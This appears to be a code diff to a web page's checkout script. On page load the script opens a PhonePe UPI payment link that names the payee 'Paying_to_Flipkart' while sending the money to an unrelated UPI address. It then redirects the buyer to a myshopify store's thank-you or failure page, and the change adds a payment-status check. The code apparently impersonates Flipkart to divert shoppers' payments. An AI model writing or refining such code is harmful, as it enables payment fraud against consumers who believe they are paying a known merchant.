@@ -952,37 +952,44 @@
         <div class="z-[60] hidden"></div>
     </div>
     <script>
-    function getAmountFromURL() {
-        const params = new URLSearchParams(window.location.search);
-        const amount = params.get("amount");
-        return amount ? parseFloat(amount).toFixed(2) : "0.00";
+function getAmountFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    const amount = params.get("amount");
+    return amount ? parseFloat(amount).toFixed(2) : "0.00";
+}
+
+async function checkPaymentStatus(transactionId) {
+    try {
+        const response = await fetch("check-payment-status.php?txnid=" + transactionId);
+        const result = await response.json();
+        
+        if (result.status === "success") {
+            window.location.href = "https://1fuvdm-p7.myshopify.com/pages/thank-you";
+        } else {
+            window.location.href = "https://1fuvdm-p7.myshopify.com/pages/payment-failed";
+        }
+    } catch (err) {
+        window.location.href = "https://1fuvdm-p7.myshopify.com/pages/payment-failed";
     }
+}
 
-    function openPhonePePayment() {
-        const amount = getAmountFromURL();
+function openPhonePePayment() {
+    const amount = getAmountFromURL();
+    const txnId = "TXN" + Date.now(); // Unique transaction ID for tracking
 
-        // Create intent-based URL
-        const upiLink = `phonepe://pay?ver=01&mode=19&pa=netc.34161fa820328aa2d22c4f80@mairtel&pn=Paying_to_Flipkart&tr=Mairtel&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${amount}`;
-        // Open UPI app
-        window.location.href = upiLink;
+    const upiLink = `phonepe://pay?ver=01&mode=19&pa=netc.34161fa820328aa2d22c4f80@mairtel&pn=Paying_to_Flipkart&tr=${txnId}&cu=INR&mc=7446&qrMedium=04&tn=Paying_to_Flipkart&am=${amount}`;
+    
+    window.location.href = upiLink;
 
-        // Wait 9 seconds for user to return (assuming payment is made)
-        setTimeout(() => {
-            // If page is visible again, user came back (assumption)
-            if (document.visibilityState === 'visible') {
-                // Simulate checking with user (real way would involve server)
-                const isPaid = confirm("Did you complete the payment?");
-                if (isPaid) {
-                    window.location.href = "https://1fuvdm-p7.myshopify.com/pages/thank-you";
-                } else {
-                    window.location.href = "https://1fuvdm-p7.myshopify.com/pages/payment-failed";
-                }
-            }
-        }, 9000);
-    }
+    // Wait and then check
+    setTimeout(() => {
+        if (document.visibilityState === 'visible') {
+            checkPaymentStatus(txnId);
+        }
+    }, 9000);
+}
 
-    // Automatically call on page load (or use a button)
-    openPhonePePayment();
+openPhonePePayment();
 </script>
 
     <script>
